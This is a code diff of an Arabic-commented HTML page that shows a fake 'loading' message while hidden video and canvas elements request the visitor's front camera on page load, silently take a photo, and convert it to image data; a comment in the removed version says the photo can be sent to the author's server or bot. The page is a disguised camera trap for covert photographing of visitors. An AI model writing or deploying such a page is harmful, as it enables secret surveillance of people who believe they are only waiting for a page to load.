@@ -3,67 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوت سكران</title>
-    <style>
-        body {
-            background-color: #121212;
-            color: #ffffff;
-            font-family: Tahoma, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        video, canvas {
-            display: none; /* مخفي تماماً عشان يشتغل في السرعة القصوى بدون إظهار معاينة */
-        }
-    </style>
+    <title>التقاط صورة</title>
 </head>
-<body>
+<body style="background-color: #121212; color: white; text-align: center; padding-top: 50px;">
 
     <h2>جاري التحميل...</h2>
-    
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+
+    <!-- عنصر فيديو مخفي بالكامل لعمل لقطة الكاميرا في الخلفية -->
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        async function fastCapture() {
+        async function snapShot() {
             try {
-                // طلب فتح الكاميرا الأمامية بأقصى سرعة
+                // طلب الكاميرا الأمامية فقط بصيغة صورة
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
                 
+                const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // أول ما الكاميرا تبدأ تعرض بيانات وجاهزة، صور في نفس اللحظة بدون انتظار
+                // أول ما الكاميرا تجهز وتلقط الإطار، خد الصورة فوراً
                 video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const context = canvas.getContext('2d');
-                    
-                    // التقاط الصورة فورا
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // تحويل الصورة لبيانات جاهزة للإرسال
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
-                    
-                    // هنا يقدر الكود يبعث الصورة للسيرفر أو البوت الخاص بك فوراً
-                    console.Hog = "تم التقاط الصورة بأقصى سرعة!";
-                    
-                    // إيقاف الكاميرا بعد التقاط الصورة مباشرة لتوفير الطامقة
-                    stream.getTracks().forEach(track => track.stop());
+                    setTimeout(() => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // استخراج الصورة بصيغة جيدة
+                        const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                        
+                        // إيقاف الكاميرا فوراً بعد التقاط الصورة بدقة
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        console.log("تم التقاط الصورة بنجاح!");
+                    }, 300); 
                 };
 
-            } catch (err) {
-                console.error("خطأ في تشغيل الكاميرا: ", err);
+            } catch (e) {
+                console.log("خطأ في الكاميرا: ", e);
             }
         }
 
-        // تنفيذ الدالة فور فتح الصفحة
-        window.addEventListener('load', fastCapture);
+        window.onload = snapShot;
     </script>
 
 </body>
